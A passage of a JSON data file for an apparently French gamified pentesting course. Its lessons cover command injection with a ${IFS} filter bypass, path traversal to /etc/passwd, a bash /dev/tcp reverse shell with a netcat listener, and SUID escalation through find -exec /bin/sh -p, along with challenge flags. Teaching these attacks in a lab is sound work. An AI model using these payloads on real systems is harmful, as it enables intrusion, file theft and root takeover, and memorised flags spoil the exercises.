        ]
      }
    },
    "challenge": {
      "type": "ping_target",
      "instructions": "Dans Net-Probe, injecte '127.0.0.1; whoami' dans le champ d'adresse. Soumets l'utilisateur système du serveur web affiché (www-data) !",
      "flag": "www-data"
    }
  },
  {
    "id": "m5-l3",
    "unitId": "m5",
    "title": "3. Contourner les Filtres et Espaces (${IFS})",
    "icon": "🥷",
    "xp": 45,
    "lessonSlides": [
      {
        "title": "Quand le Développeur Tente de Filtrer",
        "bullets": [
          "La plupart des développeurs débutants essaient de bloquer les RCE avec des filtres naïfs : *S'il y a un espace dans l'entrée, je rejette la requête !*.",
          "Est-ce que cela arrête un pentesteur chevronné ? Absolument pas !",
          "Sous Linux, le shell possède une variable interne spéciale appelée **IFS** (Internal Field Separator)."
        ]
      },
      {
        "title": "Remplacer l'Espace par ${IFS}",
        "bullets": [
          "La variable `${IFS}` contient par défaut l'espace, la tabulation et le retour à la ligne.",
          "Si le mot de passe ou le fichier contient des espaces interdits, on écrit :",
          "`cat${IFS}/etc/passwd` au lieu de `cat /etc/passwd` !",
          "Le shell Linux interprète `${IFS}` exactement comme un espace authentique, et le filtre de sécurité est réduit à néant."
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"25\" width=\"165\" height=\"70\" rx=\"8\" fill=\"#0f172a\" stroke=\"#f43f5e\" stroke-width=\"2\"/>\n          <text x=\"107\" y=\"50\" fill=\"#f87171\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">cat /etc/passwd</text>\n          <text x=\"107\" y=\"70\" fill=\"#f43f5e\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">❌ Espace bloqué par le filtre !</text>\n          <path d=\"M 200 60 L 235 60\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <rect x=\"245\" y=\"25\" width=\"140\" height=\"70\" rx=\"8\" fill=\"#030712\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"315\" y=\"50\" fill=\"#34d399\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">cat${IFS}/etc/passwd</text>\n          <text x=\"315\" y=\"70\" fill=\"#34d399\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">✓ Contournement validé !</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "# Lecture de fichiers sans aucun espace physique :"
          },
          {
            "num": 2,
            "text": "127.0.0.1;cat${IFS}/etc/passwd",
            "isCritical": true,
            "note": "${IFS} est interprété par le shell comme un séparateur d'espace standard"
          },
          {
            "num": 3,
            "text": "root:x:0:0:root:/root:/bin/bash"
          }
        ],
        "prompt": "Clique sur la charge utile qui remplace l'espace par ${IFS} :"
      },
      "tokenPuzzle": {
        "instruction": "Assemble le payload de contournement de filtre d'espace avec ${IFS} :",
        "tokens": [
          "127.0.0.1;",
          "cat${IFS}",
          "/etc/passwd",
          "rm -rf"
        ],
        "correctOrder": [
          "127.0.0.1;",
          "cat${IFS}",
          "/etc/passwd"
        ]
      },
      "quickQuiz": {
        "prompt": "Que désigne précisément la variable d'environnement '${IFS}' dans un shell Bash ?",
        "options": [
          {
            "text": "Internal Field Separator (le séparateur de champs par défaut du shell contenant l'espace, la tabulation et le saut de ligne).",
            "isCorrect": true,
            "debrief": "Exact ! Le shell s'en sert pour découper les mots d'une ligne de commande."
          },
          {
            "text": "Internet Firewall System (le pare-feu logiciel de Linux).",
            "isCorrect": false,
            "debrief": "Faux. Le pare-feu Linux est iptables / nftables."
          },
          {
            "text": "Inode File Storage (le format de table d'allocation du disque).",
            "isCorrect": false,
            "debrief": "Faux. C'est ext4, pas IFS."
          },
          {
            "text": "Instruction Frequency Sensor (la fréquence de l'horloge du processeur).",
            "isCorrect": false,
            "debrief": "Faux. Aucun rapport avec le matériel."
          }
        ]
      }
    },
    "challenge": {
      "type": "ping_target",
      "instructions": "Dans Net-Probe, injecte '127.0.0.1;cat${IFS}/etc/passwd' pour contourner le filtre d'espace et lire les comptes. Soumets le drapeau CYBER{...} révélé !",
      "flag": "CYBER{COMMAND_INJECTION_IFS_WILDCARD_BYPASS}"
    }
  },
  {
    "id": "m5-mid",
    "unitId": "m5",
    "title": "ÉVALUATION MI-PARCOURS : EXPLOITATION RCE & BYPASS WAF",
    "icon": "🛡️",
    "isCheckpoint": true,
    "xp": 75,
    "lessonSlides": [
      {
        "title": "TEST D'INTRUSION SERVEUR : Diagnostic Réseau Filtré",
        "bullets": [
          "L'infrastructure héberge un utilitaire web de diagnostic ping pour surveiller la connectivité des passerelles.",
          "Le filtre applicatif (WAF) bloque tout caractère espace (` `), croyant ainsi rendre impossible l'exécution de commandes secondaires avec arguments.",
          "Cette épreuve récapitule : injection de commande à distance (RCE), métacaractères d'enchaînement (`;`, `&&`, `|`) et contournement d'assainissement avec `${IFS}`."
        ]
      },
      {
        "title": "Consignes de la Mission d'Exploitation (Sans Guidage)",
        "bullets": [
          "1. Ouvre la console de test Net-Probe ci-dessous.",
          "2. Forge une charge d'injection sans aucun espace direct.",
          "3. Utilise la variable d'espacement Bash `${IFS}` pour concaténer une lecture du fichier système `/etc/passwd` et extraire le flag de checkpoint !"
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 500 130\" class=\"w-full h-full\">\n          <rect width=\"500\" height=\"130\" rx=\"12\" fill=\"#0f172a\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n          <circle cx=\"65\" cy=\"65\" r=\"32\" fill=\"#f59e0b\" fill-opacity=\"0.15\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n          <text x=\"65\" y=\"74\" fill=\"#f59e0b\" font-size=\"28\" text-anchor=\"middle\">🛡️</text>\n          <text x=\"120\" y=\"45\" fill=\"#f8fafc\" font-size=\"14\" font-family=\"monospace\" font-weight=\"bold\">CHECKPOINT RCE & WAF MI-PARCOURS</text>\n          <text x=\"120\" y=\"70\" fill=\"#94a3b8\" font-size=\"11\" font-family=\"monospace\">Vecteur : Injection Ping / Paramètre host sans espaces</text>\n          <rect x=\"120\" y=\"85\" width=\"350\" height=\"26\" rx=\"6\" fill=\"#1e293b\" stroke=\"#334155\"/>\n          <text x=\"130\" y=\"102\" fill=\"#f59e0b\" font-size=\"11\" font-family=\"monospace\">Contrainte : Utilisation stricte de ${IFS}</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "# Exploitation RCE : enchaînement et contournement du filtre d'espaces"
          },
          {
            "num": 2,
            "text": "127.0.0.1;cat${IFS}/etc/passwd",
            "isCritical": true,
            "note": "Le point-virgule enchaîne la commande et ${IFS} contourne l'interdiction de l'espace"
          },
          {
            "num": 3,
            "text": "CHECKPOINT_FLAG: CYBER{SERVER_MID_EVAL_COMMAND_CHAIN_PWNED}"
          }
        ],
        "prompt": "Clique sur la charge utile qui enchaîne la lecture système tout en dupant le filtre WAF :"
      },
      "tokenPuzzle": {
        "instruction": "Reconstitue la charge d'injection complète sans aucun espace brut :",
        "tokens": [
          "127.0.0.1;",
          "cat${IFS}",
          "/etc/passwd",
          "curl"
        ],
        "correctOrder": [
          "127.0.0.1;",
          "cat${IFS}",
          "/etc/passwd"
        ]
      },
      "quickQuiz": {
        "prompt": "Pourquoi un filtre applicatif qui supprime ou interdit les espaces simples est-il totalement insuffisant contre une RCE ?",
        "options": [
          {
            "text": "Parce que le shell interprète des alternatives natives comme ${IFS}, {cat,/etc/passwd} ou les redirections sans espace.",
            "isCorrect": true,
            "debrief": "Exact ! Le shell POSIX offre de nombreuses syntaxes équivalentes pour séparer les arguments."
          },
          {
            "text": "Parce que l'espace n'existe pas en binaire.",
            "isCorrect": false,
            "debrief": "Faux. L'espace ASCII 0x20 existe bien en mémoire."
          },
          {
            "text": "Parce que le câble Ethernet réinsère automatiquement les espaces perdus.",
            "isCorrect": false,
            "debrief": "Faux. Le câble transporte les trames physiques sans interprétation de mots."
          },
          {
            "text": "Parce que le processeur Intel ignore les filtres du système d'exploitation.",
            "isCorrect": false,
            "debrief": "Faux. C'est une question de syntaxe de parsing du shell."
          }
        ]
      }
    },
    "challenge": {
      "type": "ping_target",
      "instructions": "Dans Net-Probe, chaîne l'adresse 127.0.0.1 avec la lecture de /etc/passwd en utilisant ${IFS} pour contourner le filtre d'espace. Soumets la valeur du CHECKPOINT_FLAG !",
      "flag": "CYBER{SERVER_MID_EVAL_COMMAND_CHAIN_PWNED}"
    }
  },
  {
    "id": "m5-l4",
    "unitId": "m5",
    "title": "4. Traversée de Répertoire (LFI / Path Traversal)",
    "icon": "📂",
    "xp": 45,
    "lessonSlides": [
      {
        "title": "Sortir de la Prison Web : Le Path Traversal",
        "bullets": [
          "Normalement, un serveur web ne doit autoriser l'accès qu'aux fichiers situés dans son dossier public (comme `/var/www/html/`).",
          "Mais si un script PHP ou Node lit un fichier passé dans l'URL : `readDocument(req.query.file)` sans contrôle de sécurité, que peut-il se passer ?",
          "Tu te rappelles de la commande `cd ..` pour remonter d'un étage ?"
        ]
      },
      {
        "title": "La Séquence Magique ../../..",
        "bullets": [
          "En fournissant `../../../../etc/passwd` au lieu d'un nom de document ordinaire, tu ordonnes au serveur de :",
          "1. Remonter d'un dossier.",
          "2. Remonter encore.",
          "3. Atteindre la racine `/` du système.",
          "4. Entrer dans `/etc/` et lire le fichier sensible `/etc/passwd` !",
          "C'est ce qu'on appelle une faille **LFI** (Local File Inclusion / Path Traversal)."
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"25\" width=\"150\" height=\"70\" rx=\"8\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"100\" y=\"50\" fill=\"#38bdf8\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">/var/www/html/</text>\n          <text x=\"100\" y=\"70\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Racine Web autorisée</text>\n          <path d=\"M 185 60 L 225 60\" stroke=\"#f43f5e\" stroke-width=\"3\"/>\n          <rect x=\"235\" y=\"25\" width=\"140\" height=\"70\" rx=\"8\" fill=\"#030712\" stroke=\"#f43f5e\" stroke-width=\"2\"/>\n          <text x=\"305\" y=\"50\" fill=\"#f87171\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">/etc/passwd</text>\n          <text x=\"305\" y=\"70\" fill=\"#f43f5e\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">../../../../etc/passwd</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "javascript",
        "lines": [
          {
            "num": 1,
            "text": "// ❌ CODE BACKEND VULNÉRABLE AU PATH TRAVERSAL :"
          },
          {
            "num": 2,
            "text": "const filePath = path.join('/var/www/docs', req.query.file);",
            "isCritical": true,
            "note": "path.join résout les séquences .. et permet de sortir de /var/www/docs"
          },
          {
            "num": 3,
            "text": "res.sendFile(filePath); // Télécharge n'importe quel fichier système !"
          }
        ],
        "prompt": "Clique sur la ligne de code où les chemins relatifs .. ne sont pas assainis :"
      },
      "tokenPuzzle": {
        "instruction": "Assemble le payload classique de traversée de répertoire vers /etc/passwd :",
        "tokens": [
          "../../../../",
          "etc/passwd",
          "/home",
          "rm"
        ],
        "correctOrder": [
          "../../../../",
          "etc/passwd"
        ]
      },
      "quickQuiz": {
        "prompt": "Comment les séquences de points '../../..' permettent-elles d'accéder à des fichiers système confidentiels ?",
        "options": [
          {
            "text": "En modifiant l'adresse IP de la victime.",
            "isCorrect": false,
            "debrief": "Faux. Les adresses IP ne changent pas."
          },
          {
            "text": "En faisant remonter l'arborescence des dossiers jusqu'à la racine '/', annulant ainsi la restriction du dossier web initial.",
            "isCorrect": true,
            "debrief": "Exact ! Chaque '..' remonte d'un niveau jusqu'à atteindre la racine absolue."
          },
          {
            "text": "En supprimant les mots de passe du disque dur.",
            "isCorrect": false,
            "debrief": "Faux. La traversée de répertoire n'efface rien, elle lit."
          },
          {
            "text": "En forçant le processeur à surchauffer.",
            "isCorrect": false,
            "debrief": "Faux. Aucun lien physique."
          }
        ]
      }
    },
    "challenge": {
      "type": "lfi_target",
      "instructions": "Dans la visionneuse de documents d'entreprise ci-dessous, injecte '../../../../etc/passwd' dans le champ de sélection. Soumets le drapeau CYBER{...} trouvé dans les comptes !",
      "flag": "CYBER{LFI_PATH_TRAVERSAL_ETC_PASSWD}"
    }
  },
  {
    "id": "m5-l5",
    "unitId": "m5",
    "title": "5. Le Concept du Reverse Shell (Connexion Inversée)",
    "icon": "🔄",
    "xp": 50,
    "lessonSlides": [
      {
        "title": "Le Problème du Pare-Feu (Firewall)",
        "bullets": [
          "Quand un pirate veut prendre le contrôle d'un serveur distant, pourquoi ne peut-il pas simplement ouvrir un port SSH ou un shell d'écoute direct (**Bind Shell**) ?",
          "Parce que les pare-feux d'entreprise bloquent **TOUTES les connexions entrantes** !",
          "En revanche, les pare-feux laissent presque toujours sortir les connexions vers le Web extérieur."
        ]
      },
      {
        "title": "La Ruse du Reverse Shell",
        "bullets": [
          "La solution de génie est le **Reverse Shell** (shell inversé) :",
          "1. L'attaquant met sa propre machine en écoute sur un port avec Netcat : `nc -lvnp 4444`.",
          "2. Via une faille RCE sur le serveur, il force la cible à initier une connexion **SORTANTE** vers l'attaquant : `bash -i >& /dev/tcp/IP_ATTAQUANT/4444 0>&1`.",
          "3. Le pare-feu autorise le flux sortant, et le serveur distant offre son propre terminal interactif sur l'écran du pirate !"
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"25\" width=\"130\" height=\"70\" rx=\"8\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"90\" y=\"55\" fill=\"#38bdf8\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">Serveur Cible</text>\n          <text x=\"90\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Exécute le payload</text>\n          <path d=\"M 165 60 L 235 60\" stroke=\"#f43f5e\" stroke-width=\"3\"/>\n          <text x=\"200\" y=\"50\" fill=\"#f87171\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">SORTANT ➔</text>\n          <rect x=\"245\" y=\"25\" width=\"130\" height=\"70\" rx=\"8\" fill=\"#030712\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"310\" y=\"55\" fill=\"#34d399\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">Machine Attaquant</text>\n          <text x=\"310\" y=\"75\" fill=\"#10b981\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">nc -lvnp 4444 (Écoute)</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "# 1. Sur la machine de l'attaquant : mise en écoute netcat :"
          },
          {
            "num": 2,
            "text": "attacker@kali:~$ nc -lvnp 4444"
          },
          {
            "num": 3,
            "text": "# 2. Payload injecté sur la cible pour initier la connexion sortante :"
          },
          {
            "num": 4,
            "text": "target@server:~$ bash -i >& /dev/tcp/192.168.1.50/4444 0>&1",
            "isCritical": true,
            "note": "Redirige stdin, stdout et stderr vers le socket TCP de l'attaquant"
          }
        ],
        "prompt": "Clique sur la charge utile qui initie la connexion inversée sortante :"
      },
      "tokenPuzzle": {
        "instruction": "Construis la commande de redirection de socket vers /dev/tcp :",
        "tokens": [
          "bash -i >&",
          "/dev/tcp/192.168.1.50/4444",
          "0>&1",
          "ping"
        ],
        "correctOrder": [
          "bash -i >&",
          "/dev/tcp/192.168.1.50/4444",
          "0>&1"
        ]
      },
      "quickQuiz": {
        "prompt": "Pourquoi préfère-t-on utiliser un Reverse Shell plutôt qu'un Bind Shell lors d'un test d'intrusion externe ?",
        "options": [
          {
            "text": "Parce que les Bind Shells sont interdits par l'Union Européenne.",
            "isCorrect": false,
            "debrief": "Faux. C'est une question de topologie de pare-feu réseau, pas de législation."
          },
          {
            "text": "Parce que le reverse shell ne nécessite aucun ordinateur.",
            "isCorrect": false,
            "debrief": "Faux. Il nécessite deux machines connectées."
          },
          {
            "text": "Parce que les pare-feux bloquent généralement les connexions entrantes mais autorisent les flux réseau sortants initiés par la cible.",
            "isCorrect": true,
            "debrief": "Exactement ! Le reverse shell traverse naturellement les pare-feux et NAT d'entreprise."
          },
          {
            "text": "Parce que le reverse shell double la bande passante de la connexion.",
            "isCorrect": false,
            "debrief": "Faux. Il n'a aucun impact sur le débit réseau physique."
          }
        ]
      }
    },
    "challenge": {
      "type": "ping_target",
      "instructions": "Dans Net-Probe, simule la connexion socket sortante en injectant une redirection socket vers /dev/tcp. Soumets le drapeau CYBER{...} capturé sur l'écouteur !",
      "flag": "CYBER{RAW_SOCKET_BEACON_CAPTURED}"
    }
  },
  {
    "id": "m5-l6",
    "unitId": "m5",
    "title": "6. Privilèges Linux : De www-data à Root",
    "icon": "👑",
    "xp": 45,
    "lessonSlides": [
      {
        "title": "La Différence Entre un Compte Restreint et le Dieu Root",
        "bullets": [
          "Quand tu obtiens un accès initial via une faille web (RCE), tu es généralement connecté sous l'utilisateur du serveur web : `www-data` ou `operator`.",
          "Ce compte est bridé : tu ne peux pas lire les mots de passe maîtres dans `/etc/shadow`, tu ne peux pas installer de pilotes, ni espionner le trafic réseau.",
          "Ton objectif ultime est de devenir **root** (l'administrateur suprême qui a tous les pouvoirs sur le noyau Linux)."
        ]
      },
      {
        "title": "L'Audit des Privilèges : La Commande id",
        "bullets": [
          "Chaque utilisateur possède un **UID** (User ID) numérique :",
          "• Les utilisateurs normaux ont un UID supérieur ou égal à 1000.",
          "• L'administrateur suprême **root possède TOUJOURS l'UID 0** !",
          "La commande `id` affiche instantanément ton UID, ton GID et tous tes groupes de sécurité."
        ],
        "syntaxBox": {
          "command": "id",
          "description": "Affiche l'UID, le GID et les groupes de l'utilisateur actif.",
          "example": "uid=1001(operator) gid=1001(operator) groups=1001(operator)"
        }
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"25\" width=\"165\" height=\"70\" rx=\"8\" fill=\"#0f172a\" stroke=\"#475569\" stroke-width=\"2\"/>\n          <text x=\"107\" y=\"50\" fill=\"#94a3b8\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">operator (UID 1001)</text>\n          <text x=\"107\" y=\"70\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Droits restreints ($)</text>\n          <text x=\"107\" y=\"85\" fill=\"#f43f5e\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Lecture /etc/shadow INTERDITE</text>\n          <path d=\"M 200 60 L 235 60\" stroke=\"#f59e0b\" stroke-width=\"3\"/>\n          <rect x=\"245\" y=\"25\" width=\"140\" height=\"70\" rx=\"8\" fill=\"#030712\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"315\" y=\"50\" fill=\"#34d399\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">ROOT (UID 0)</text>\n          <text x=\"315\" y=\"70\" fill=\"#34d399\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Pouvoirs suprêmes (#)</text>\n          <text x=\"315\" y=\"85\" fill=\"#38bdf8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Accès total à tout</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "# Vérification de l'identité et de l'UID système :"
          },
          {
            "num": 2,
            "text": "operator@cyberlab:~$ id",
            "isCritical": true,
            "note": "id affiche l'UID : 0 pour root, 1000+ pour utilisateur ordinaire"
          },
          {
            "num": 3,
            "text": "uid=1001(operator) gid=1001(operator) groups=1001(operator),27(sudo)"
          }
        ],
        "prompt": "Clique sur la commande qui vérifie les identifiants UID et GID :"
      },
      "tokenPuzzle": {
        "instruction": "Tape la commande pour afficher tes identifiants numériques de compte :",
        "tokens": [
          "id",
          "whoami",
          "hostname",
          "uname"
        ],
        "correctOrder": [
          "id"
        ]
      },
      "quickQuiz": {
        "prompt": "Quel est l'identifiant numérique d'utilisateur (UID) réservé universellement au compte super-administrateur root sous Linux ?",
        "options": [
          {
            "text": "L'UID 404.",
            "isCorrect": false,
            "debrief": "Faux. 404 est un code HTTP, pas un UID système."
          },
          {
            "text": "L'UID 1000.",
            "isCorrect": false,
            "debrief": "Faux. L'UID 1000 est attribué au premier utilisateur standard créé lors de l'installation."
          },
          {
            "text": "L'UID 9999.",
            "isCorrect": false,
            "debrief": "Faux. 9999 est un compte ordinaire ou de service."
          },
          {
            "text": "L'UID 0 (zéro).",
            "isCorrect": true,
            "debrief": "Exact ! Sous Linux, c'est l'UID 0 qui confère l'immunité et les droits absolus, quel que soit le nom d'utilisateur."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Dans le terminal, tape 'id' pour auditer ton utilisateur. Soumets la première chaîne d'identifiant retournée (uid=1001(operator)) !",
      "flag": "uid=1001(operator)"
    }
  },
  {
    "id": "m5-l7",
    "unitId": "m5",
    "title": "7. L'Arme Fatale : Les Binaires SUID",
    "icon": "⚡",
    "xp": 50,
    "lessonSlides": [
      {
        "title": "La Faille d'Élévation la Plus Célèbre : SUID",
        "bullets": [
          "Normalement, quand tu exécutes un programme, il tourne avec **tes propres droits** (ceux d'un utilisateur ordinaire).",
          "Mais Linux possède un bit de permission spéciale appelé le **SetUID** (**SUID**).",
          "Quand un binaire possède le bit SUID, il s'exécute avec les privilèges du **propriétaire du fichier**... qui est très souvent **root** !"
        ]
      },
      {
        "title": "Comment Repérer les Binaires SUID",
        "bullets": [
          "Dans un listing `ls -l`, le 'x' d'exécution du propriétaire est remplacé par un '**s**' rouge : `-rwsr-xr-x`.",
          "Pour chasser tous les binaires SUID du système, on lance la commande :",
          "`find / -perm -u=s -type f 2>/dev/null`.",
          "Si un utilitaire ordinaire est listé, la conquête du compte root est à portée de main !"
        ],
        "syntaxBox": {
          "command": "find / -perm -u=s 2>/dev/null",
          "description": "Scanne tout le disque à la recherche de fichiers ayant le bit SUID actif.",
          "example": "/usr/bin/find  /usr/bin/passwd"
        }
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"25\" width=\"165\" height=\"70\" rx=\"8\" fill=\"#0f172a\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n          <text x=\"107\" y=\"48\" fill=\"#fbbf24\" font-size=\"10\" font-family=\"monospace\" text-anchor=\"middle\">Bit SUID actif : 's'</text>\n          <text x=\"107\" y=\"68\" fill=\"#f87171\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">-rw<tspan font-weight=\"bold\">s</tspan>r-xr-x /usr/bin/find</text>\n          <text x=\"107\" y=\"85\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Propriétaire : root</text>\n          <path d=\"M 200 60 L 235 60\" stroke=\"#10b981\" stroke-width=\"3\"/>\n          <rect x=\"245\" y=\"25\" width=\"140\" height=\"70\" rx=\"8\" fill=\"#030712\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"315\" y=\"50\" fill=\"#34d399\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">Exécution = ROOT (#)</text>\n          <text x=\"315\" y=\"70\" fill=\"#34d399\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">PrivEsc Immédiat !</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "# Découverte des binaires possédant la permission spéciale SUID :"
          },
          {
            "num": 2,
            "text": "operator@cyberlab:~$ find / -perm -u=s 2>/dev/null",
            "isCritical": true,
            "note": "-perm -u=s filtre les fichiers dont le bit SetUID est armé"
          },
          {
            "num": 3,
            "text": "/usr/bin/passwd"
          },
          {
            "num": 4,
            "text": "/usr/bin/find"
          }
        ],
        "prompt": "Clique sur la commande find qui recherche les binaires SUID :"
      },
      "tokenPuzzle": {
        "instruction": "Tape la commande universelle de détection des binaires SUID :",
        "tokens": [
          "find /",
          "-perm -u=s",
          "2>/dev/null",
          "grep"
        ],
        "correctOrder": [
          "find /",
          "-perm -u=s",
          "2>/dev/null"
        ]
      },
      "quickQuiz": {
        "prompt": "Que provoque l'activation du bit spécial SUID sur un fichier exécutable appartenant à l'utilisateur root ?",
        "options": [
          {
            "text": "Le fichier devient impossible à supprimer pour toujours.",
            "isCorrect": false,
            "debrief": "Faux. root peut toujours supprimer n'importe quel fichier."
          },
          {
            "text": "Le terminal refuse d'ouvrir le dossier personnel.",
            "isCorrect": false,
            "debrief": "Faux. Cela n'affecte pas la navigation."
          },
          {
            "text": "Le fichier est automatiquement chiffré en AES-256.",
            "isCorrect": false,
            "debrief": "Faux. Le SUID n'est pas un système de chiffrement."
          },
          {
            "text": "Toute personne qui lance ce programme l'exécute temporairement avec les privilèges et pouvoirs de root.",
            "isCorrect": true,
            "debrief": "Exact ! Le bit SUID élève l'eUID (effective UID) au niveau du propriétaire du fichier."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Dans le terminal, cherche les binaires SUID avec 'find / -perm -u=s 2>/dev/null'. Repère le binaire anormal /usr/bin/find et soumets son chemin complet !",
      "flag": "/usr/bin/find"
    }
  },
  {
    "id": "m5-l8",
    "unitId": "m5",
    "title": "8. La Bible GTFOBins : Détourner un Binaire",
    "icon": "📖",
    "xp": 50,
    "lessonSlides": [
      {
        "title": "Le Projet GTFOBins",
        "bullets": [
          "Si un binaire système anodin comme `find`, `vim`, `bash`, `python` ou `cp` possède le bit SUID, c'est la fin immédiate de la sécurité du système.",
          "Le projet mondial **GTFOBins** répertorie les commandes exactes permettant de forcer ces programmes ordinaires à spawner un terminal root !",
          "Par exemple, la commande `find` possède l'option `-exec` pour exécuter une commande sur chaque fichier trouvé."
        ]
      },
      {
        "title": "La Commande d'Élévation find",
        "bullets": [
          "En tapant : `/usr/bin/find . -exec /bin/sh -p \\; -quit`, que se passe-t-il ?",
          "1. `find` s'exécute avec les droits SUID de root.",
          "2. Son option `-exec` lance `/bin/sh` avec l'option `-p` (**preserve privileges**).",
          "3. Le shell s'ouvre, ton prompt passe instantanément de `$` à `#` : **tu es devenu ROOT Suprême** !"
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"25\" width=\"165\" height=\"70\" rx=\"8\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"107\" y=\"50\" fill=\"#38bdf8\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">Binaire SUID : find</text>\n          <text x=\"107\" y=\"70\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">-exec /bin/sh -p ;</text>\n          <path d=\"M 200 60 L 235 60\" stroke=\"#10b981\" stroke-width=\"3\"/>\n          <rect x=\"245\" y=\"25\" width=\"140\" height=\"70\" rx=\"8\" fill=\"#030712\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"315\" y=\"50\" fill=\"#34d399\" font-size=\"12\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\"># root@cyberlab</text>\n          <text x=\"315\" y=\"70\" fill=\"#34d399\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Élévation Root Validée !</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "# 1. Exécution de la charge utile GTFOBins sur le binaire find :"
          },
          {
            "num": 2,
            "text": "operator@cyberlab:~$ find . -exec /bin/sh -p \\; -quit",
            "isCritical": true,
            "note": "Cette commande GTFOBins force le binaire SUID find à ouvrir un sous-shell root"
          },
          {
            "num": 3,
            "text": "# 2. Le prompt devient '#' (root) :"
          },
          {
            "num": 4,
            "text": "root@cyberlab:~# whoami ➔ root"
          }
        ],
        "prompt": "Clique sur la commande GTFOBins qui force find à ouvrir un shell root :"
      },
      "tokenPuzzle": {
        "instruction": "Assemble la commande GTFOBins pour faire spawner un shell avec find :",
        "tokens": [
          "find .",
          "-exec /bin/sh -p \\;",
          "-quit",
          "cat"
        ],
        "correctOrder": [
          "find .",
          "-exec /bin/sh -p \\;",
          "-quit"
        ]
      },
      "quickQuiz": {
        "prompt": "Quel symbole dans le prompt du terminal confirme sans ambiguïté que tu as conquis les pouvoirs suprêmes de root ?",
        "options": [
          {
            "text": "Le caractère dièse '#' remplace le dollar '$' à la fin de la ligne.",
            "isCorrect": true,
            "debrief": "Exact ! Sous Linux, '$' est un utilisateur classique, et '#' est le super-administrateur Root."
          },
          {
            "text": "L'écran devient bleu ciel et joue de la musique.",
            "isCorrect": false,
            "debrief": "Faux. L'environnement reste textuel dans le terminal."
          },
          {
            "text": "L'ordinateur se déconnecte immédiatement d'Internet.",
            "isCorrect": false,
            "debrief": "Faux. Devenir root n'interrompt aucune connexion."
          },
          {
            "text": "La souris cesse physiquement de fonctionner.",
            "isCorrect": false,
            "debrief": "Faux. Le matériel n'est aucunement altéré."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
